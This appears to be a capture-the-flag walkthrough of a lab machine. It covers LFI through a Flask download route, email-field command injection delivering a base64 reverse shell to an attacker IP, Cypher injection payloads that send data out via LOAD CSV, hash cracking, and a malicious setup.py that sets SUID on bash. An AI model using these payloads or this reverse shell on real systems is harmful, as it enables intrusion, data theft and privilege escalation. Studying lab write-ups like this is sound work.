
# OnlyForYou

![logo](https://github.com/InfoSec-Crow/Writeups/blob/main/htb/machines/OnlyForYou/OnlyForYou.png)

## nmap
    
    ```
    PORT   STATE SERVICE REASON  VERSION
    22/tcp open  ssh     syn-ack OpenSSH 8.2p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0)
    | ssh-hostkey:
    |   3072 e883e0a9fd43df38198aaa35438411ec (RSA)
    | ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQDX7r34pmJ6U9KrHg0/WDdrofcOXqTr13Iix+3D5ChuYwY2fmqIBlfuDo0Cz0xLnb/jaT3ODuDtmAih6unQluWw3RAf03l/tHxXfvXlWBE3I7uDu+roHQM7+hyShn+559JweJlofiYKHjaErMp33DI22BjviMrCGabALgWALCwjqaV7Dt6ogSllj+09trFFwr2xzzrqhQVMdUdljle99R41Hzle7QTl4maonlUAdd2Ok41ACIu/N2G/iE61snOmAzYXGE8X6/7eqynhkC4AaWgV8h0CwLeCCMj4giBgOo6EvyJCBgoMp/wH/90U477WiJQZrjO9vgrh2/cjLDDowpKJDrDIcDWdh0aE42JVAWuu7IDrv0oKBLGlyznE1eZsX2u1FH8EGYXkl58GrmFbyIT83HsXjF1+rapAUtG0Zi9JskF/DPy5+1HDWJShfwhLsfqMuuyEdotL4Vzw8ZWCIQ4TVXMUwFfVkvf410tIFYEUaVk5f9pVVfYvQsCULQb+/uc=
    |   256 83f235229b03860c16cfb3fa9f5acd08 (ECDSA)
    | ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBAz/tMC3s/5jKIZRgBD078k7/6DY8NBXEE8ytGQd9DjIIvZdSpwyOzeLABxydMR79kDrMyX+vTP0VY5132jMo5w=
    |   256 445f7aa377690a77789b04e09f11db80 (ED25519)
    |_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIOqatISwZi/EOVbwqfFbhx22EEv6f+8YgmQFknTvg0wr
    80/tcp open  http    syn-ack nginx 1.18.0 (Ubuntu)
    |_http-server-header: nginx/1.18.0 (Ubuntu)
    | http-methods:
    |_  Supported Methods: GET HEAD OPTIONS
    |_http-title: Did not follow redirect to http://only4you.htb/
    ```
    

## LFI via `download()`

- script for automation
    
    ```python
    #!/usr/bin/python3
    import os, sys
    down = "/home/kali/Downloads"
    folder = "/home/kali/Desktop/htb/Box/onlyforyou/lfi/"
    def read(filename):
        cmd = "curl -s -i -k -X 'POST' -H 'Host: beta.only4you.htb' -H 'Cache-Control: max-age=0' -H 'Upgrade-Insecure-Requests: 1' -H 'Origin: http://beta.only4you.htb' -H 'Content-Type: application/x-www-form-urlencoded' --data-binary 'image="+filename+"' 'http://beta.only4you.htb/download'"
        output = os.popen(cmd).read()
        return output
    def save_file(output, filename):
        if "Content-Length: 197" in output:
            print(f"[-]: {filename}")
        else:
            try:
                save_file = filename.replace("/","_")
                with open(folder+save_file, 'a') as out:
                    out.write(output + '\n')
            except:
                pass
            print(f"[+]: {filename}")
    filename = sys.argv[2]
    mod = sys.argv[1]
    if mod == "f":
        print(read(filename))
    elif mod == "fw":
        save_file(read(filename), filename)
    elif mod == "b":
        wordlist = filename
        with open(wordlist) as f:
            lines = f.readlines()
        for path in lines:
            output = read(path.strip())
            save_file(output, path.strip())
    else:
        print("script.py [MOD] [FILE_TO_READ, WORDLIST]")
        exit()
    ```
    
    Short, only read file
    
    ```python
    #!/usr/bin/python3
    import os, sys
    
    def read(filename):
        cmd = "curl -s -i -k -X 'POST' -H 'Host: beta.only4you.htb' -H 'Cache-Control: max-age=0' -H 'Upgrade-Insecure-Requests: 1' -H 'Origin: http://beta.only4you.htb' -H 'Content-Type: application/x-www-form-urlencoded' --data-binary 'image="+filename+"' 'http://beta.only4you.htb/download'"
        return os.popen(cmd).read()
    
    filename = sys.argv[1]
    print(read(filename))
    
    ```
    

We can set a absolute path to download any file on the system.

- `download()` function
    
    ```python
    @app.route('/download', methods=['POST'])
    def download():
        image = request.form['image']
        filename = posixpath.normpath(image) 
        if '..' in filename or filename.startswith('../'):
            flash('Hacking detected!', 'danger')
            return redirect('/list')
        if not os.path.isabs(filename):
            filename = os.path.join(app.config['LIST_FOLDER'], filename)
        try:
            if not os.path.isfile(filename):
                flash('Image doesn\'t exist!', 'danger')
                return redirect('/list')
        except (TypeError, ValueError):
            raise BadRequest()
        return send_file(filename, as_attachment=True)
    ```
    

```python
import os

def test():
    filename = "/abc/omg/test"
    filename = os.path.join("/tmp/test/uploads/list", filename)
    print(filename)
test()
```

This is because the `os.path.join()` dont use the given path when the filname starts with `/`

We can read the config file of the nginx server to get the web folder path.

- `/etc/nginx/sites-enabled/default`
    
    ```python
    server {
        listen 80;
        return 301 http://only4you.htb$request_uri;
    }
    server {
    	listen 80;
    	server_name only4you.htb;
    
    	location / {
                    include proxy_params;
                    proxy_pass http://unix:/var/www/only4you.htb/only4you.sock;
    	}}
    server {
    	listen 80;
    	server_name beta.only4you.htb;
            location / {
                    include proxy_params;
                    proxy_pass http://unix:/var/www/beta.only4you.htb/beta.sock;
    ```
    
- `/var/www/only4you.htb/app.py`
- `/var/www/beta.only4you.htb/app.py`

We find in `/var/www/only4you.htb/app.py`

```python
from form import sendmessage
```

We find the file `/var/www/only4you.htb/form.py`

# Command Injection

```python
def issecure(email, ip):
	if not re.match("([A-Za-z0-9]+[.-_])*[A-Za-z0-9]+@[A-Za-z0-9-]+(\.[A-Z|a-z]{2,})", email):
		return 0
	else:
		domain = email.split("@", 1)[1]
		result = run([f"dig txt {domain}"], shell=True, stdout=PIPE) # <--
		output = result.stdout.decode('utf-8')
		if "v=spf1" not in output:
			return 1
		else:
			domains = []
			ips = []
<SNIP>
```

We can inject a OS command in the email, because the domain is not validated. 

```
name=test&email=test%40example.de; echo YmFzaCAtYyAnYmFzaCAtaSAgPiYgL2Rldi90Y3AvMTAuMTAuMTQuNDIvMTIzNCAwPiYxJw== | base64 -d | bash  #&subject=test&message=test
```

We get in the response cookie the msg. But the command is executed.

```python
{"_flashes":[{" t":["danger","You are not authorized!"]}]}
```

uid=33(www-data) gid=33(www-data) groups=33(www-data)

# Lateral Movement

![Untitled](https://github.com/InfoSec-Crow/Writeups/blob/main/htb/machines/OnlyForYou/openports.png)

We see the local port 8001 is open.

- [http://127.0.0.1:8001/login](http://127.0.0.1:8001/login)

Default creds

`admin : admin`

We find a SQL injection in the search funkction, when we use the char `'` it gets a 500 Server Error !

## Cypher Injection `neo4j`

SQL Injection from SQLmap

- search=`a' AND 1=1 AND 'A'='A`

### Read Database Version

[Cypher Injection (neo4j)](https://book.hacktricks.xyz/pentesting-web/sql-injection/cypher-injection-neo4j#extracting-information)

- `' OR 1=1 WITH 1 as a CALL dbms.components() YIELD name, versions, edition UNWIND versions as version LOAD CSV FROM 'http://10.10.14.42/?version='+ version + '&name=' + name + '&edition=' + edition as l RETURN 0 as _0 //`

### Get labels

- `' OR 1=1 WITH 1 as a CALL db.labels() YIELD label LOAD CSV FROM 'http://10.10.14.42/?label='+label as l RETURN 0 as _0 //`

user, employee

### Get colum from labels

- `' OR 1=1 WITH 1 as a MATCH (f:user) UNWIND keys(f) as p LOAD CSV FROM 'http://10.10.14.42/?'+ p +'='+toString(f[p]) as l RETURN 0 as _0 //`

admin : 8c6976e5b5410415bde908bd4dee15dfb167a9c873fc4bb8a81f6f2ab448a918 - admin

john : a85e870c05825afeac63215d5e845aa7f3088cd15359ea88fa4061c6411c55f6 - ?

### Crack Hack

Crack hash from user john

- `hashcat -m 1400 hash /usr/share/wordlists/rockyou.txt`

PW: ThisIs4You

→ user.txt

# Priv Esc

- `sudo -l`

```
User john may run the following commands on only4you:
(root) NOPASSWD: /usr/bin/pip3 download http\://127.0.0.1\:3000/*.tar.gz
```

## pip download

[Malicious Python Packages and Code Execution via pip download](https://embracethered.com/blog/posts/2022/python-package-manager-install-and-download-vulnerability/)

We can login to Gogs with john and the password. Use the Test repo to crate a setup.py

https://github.com/wunderwuzzi23/this_is_fine_wuzzi/

```python
from setuptools import setup, find_packages
from setuptools.command.install import install
from setuptools.command.egg_info import egg_info

def RunCommand():
    import os 
    os.popen("chmod u+s /bin/bash").read()

class RunEggInfoCommand(egg_info):
    def run(self):
        RunCommand()
        egg_info.run(self)

class RunInstallCommand(install):
    def run(self):
        RunCommand()
        install.run(self)

setup(
    name = "this_is_fine_wuzzi",
    version = "0.0.1",
    license = "MIT",
    packages=find_packages(),
    cmdclass={
        'install' : RunInstallCommand,
        'egg_info': RunEggInfoCommand
    },
)
```

Change the Repo to public !

- `sudo /usr/bin/pip3 download http://127.0.0.1:3000/john/Test/archive/master.tar.gz`

→ root.txt
